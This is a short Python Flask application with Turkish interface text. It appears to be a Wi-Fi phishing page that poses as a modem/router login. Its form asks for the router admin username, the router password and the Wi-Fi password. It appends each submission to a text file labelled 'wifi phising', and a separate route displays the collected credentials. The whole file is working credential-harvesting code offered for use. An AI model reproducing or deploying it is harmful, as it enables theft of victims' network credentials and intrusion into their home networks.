from flask import Flask,render_template,url_for,redirect,request
from wtforms import Form,StringField,validators,PasswordField


h=""
app = Flask(__name__)

class loginForm(Form):
    usernameroutue = StringField("modem arayüz kullanıcı adını giriniz:",validators=[validators.DataRequired("bu alan boş bırakılamaz...")])
    userrotuepassword = StringField("modem arayüz şifrenizi giriniz:",validators=[validators.DataRequired("bu alan boş bırakılamaz...")])
    userwifipassword = StringField("wifi şifrenizi giriniz:",validators=[validators.DataRequired("bu alan boş bırakılamaz"),validators.Length(min=8,max=65,message="wifi parolası 8 karakterden az olamaz")])

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/login",methods=["GET","POST"])
def login():
    form = loginForm(request.form)

    if request.method == "POST" and form.validate() :
        namerouter = form.usernameroutue.data
        passrouter = form.userrotuepassword.data
        passwifi = form.userwifipassword.data
        b = open("bilgiler.txt","a")
        b.writelines("modem arayuz kullanıcı adı = " + namerouter +"\n")
        b.writelines("modem arayuz sifresi = " + passrouter +"\n")
        b.writelines("wifi sifresi  = " + passwifi +"\n\n")
        b.writelines(" -----------------> wifi phising\n \n")
        
       
        
        return redirect(url_for("index"))
    else:
        return render_template("login.html",form=form)
@app.route("/bilgiler")
def bilgiler():
    c= open("bilgiler.txt")
    h= c.readlines()
    
    return render_template("bilgiler.html",h=h)

if __name__ == "__main__":
    app.run(debug=True)


